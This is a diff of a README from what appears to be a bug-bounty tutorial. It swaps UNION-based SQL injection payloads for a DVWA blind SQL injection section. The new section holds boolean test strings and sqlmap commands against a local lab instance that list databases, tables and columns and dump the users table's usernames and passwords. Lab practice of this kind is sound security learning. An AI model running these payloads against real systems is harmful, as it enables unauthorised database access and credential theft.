@@ -1,13 +1,14 @@
 # bug-bounty-tutorial
 bug bounty tutorial
 
-## 3.intro bug bounty
+## 13.dvwa-low-blind-sql-injection-low
 ```
-' OR 1=1 #
-1' OR 1=1 UNION SELECT 1, VERSION()#
-1' OR 1=1 UNION SELECT 1,DATABASE() #
+x' OR 1='1
+x' OR 1='2
 
-1' OR 1=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' #
+sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=soj3nln17q4uer00qe467r13v2; security=low" --dbs
+sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=soj3nln17q4uer00qe467r13v2; security=low" -D dvwa --tables
+sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=soj3nln17q4uer00qe467r13v2; security=low" -D dvwa -T users --columns
 
-1' OR 1=1 UNION SELECT user, password FROM users #
+sqlmap -u "http://127.0.0.1:42001/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=soj3nln17q4uer00qe467r13v2; security=low" -D dvwa -T users -C user,password --dump
 ```
